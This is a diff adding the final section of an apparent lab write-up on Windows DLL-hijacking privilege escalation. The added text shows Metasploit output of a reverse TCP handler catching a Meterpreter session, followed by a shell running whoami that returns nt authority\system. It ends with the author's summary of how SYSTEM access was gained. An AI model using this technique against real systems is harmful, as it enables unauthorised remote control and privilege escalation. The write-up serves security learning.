@@ -313,3 +313,28 @@ net start dllsvc
 The DLL Hijack Service service is starting.
 The DLL Hijack Service service was started successfully.
 ```
+### Metasploit Caught the Connection
+
+```
+[*] Started reverse TCP handler on 192.168.5.128:4444 
+[*] Sending stage (244806 bytes) to 192.168.5.144
+[*] Meterpreter session 1 opened (192.168.5.128:4444 -> 192.168.5.144:62472) at 2026-06-23 08:57:02 -0400
+```
+### Dropped into a Shell and Checked Privileges
+
+```bash
+meterpreter > shell
+```
+```bash
+C:\Windows\system32> whoami
+```
+**Output:**
+
+```
+nt authority\system
+```
+<p align="center">
+  <img src="images/step5-1.png" width="600">
+</p>
+
+I went from a normal low privilege user to `nt authority\system` just by dropping a DLL file into a writable folder and restarting a service.
